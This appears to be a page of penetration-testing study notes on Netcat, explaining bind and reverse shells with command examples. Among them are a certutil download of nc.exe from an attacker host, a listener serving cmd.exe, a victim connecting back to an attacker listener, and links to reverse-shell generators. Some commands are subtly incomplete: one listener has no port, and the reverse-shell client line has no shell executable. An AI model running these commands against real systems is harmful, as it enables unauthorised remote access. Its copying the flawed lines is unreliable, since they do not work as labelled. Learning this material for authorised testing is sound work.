---
description: Bind and Reverse Shells
---

# 5 - Shells

## <mark style="color:red;">Netcat Fundamentals</mark>

* Netcat (Aka TCP/IP Swiss Army Knife) is a networking utility used to read and write data to network connections using TCP or UDP.
* Netcat is available for both \*NIX and Windows operating systems, consequently making it extremely useful for cross-platform engagements.
* Netcat utilizes a client-server communication architecture with two modes:
  * **Client mode** - Netcat can be used in client mode to connect to any TCP/UDP port as well as a Netcat listener (server).
  * **Server mode** - Netcat can be used to listen for connections from clients on a specific port.
* Netcat can be used by penetration testers to perform the following functionality:
  * Banner Grabbing
  * Port Scanning
  * Transferring Files
  * Bind/Reverse Shells

### **Practical Demonstration**

```bash
nc -h # help menu.
nc -nv <targetIP> <targetPort> #Connect to a port with NoDNS and Verbose flags
nc <...> -u #Connect via a UDP port (TCP default)
/usr/share/windows-binaries/nc.exe #Location of the nc windows binary

#Transfer the nc.exe windows binary from attacker to victim system:
#Setup a webserver (python) in the nc binary folder on the attacker side
cmd > certutil -urlcache -f http://<localIP>/nc.exe <binaryName> #Download the nc.exe binary from thea attacker system

nc -nvlp <port> #Listen for any connection on port 1234
cmd > nc.exe -nv <localIP> <port> #Connect to the nc listener

#How to transfer files using netcat
#The file receiver need to be listening (server) and the file sender needs to connect (client)
cmd > nc.exe -nvlp <port> > <fileName> #Redirect everything received from a netcat client to a file
nc -nv <targetIP> <port> < <fileName> #Send the file to the netcat listener
```





## <mark style="color:red;">Bind Shells</mark>

**Bind Shells**

▪ A bind shell is a type of remote shell where the attacker connects directly to a listener on the target system, consequently allowing for execution of commands on the target system.

▪ A Netcat listener can be setup to execute a specific executable like cmd.exe or /bin/bash when a client connects to the listener.

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

**Practical Demonstration**

```
cmd > nc -lvnp -e cmd.exe #Setup a listener that will grant access to cmd.exe to the client system
nc -nv <targetIP> <port> #Connect to the victim system via a bind shell
```





## <mark style="color:red;">Reverse Shells</mark>

* A reverse shell is a type of remote shell where the target connects directly to a listener on the attacker's system, consequently allowing for execution of commands on the target system.

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**Practical Demonstration**

```
nc -nlvp 1234 #Setup a listener on the attacker system
cmd > nc.exe -nv <localIP> <port> #Connect to the attacker system using the vicitm system (reverse shell)
```

## Reverse Shell Cheatsheet

**Practical Demonstration**

```
#List of useful resources related to reverse shells:

#https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md Reverse Shell Cheatsheet
#https://www.revshells.com/ Reverse Shell Generator
```







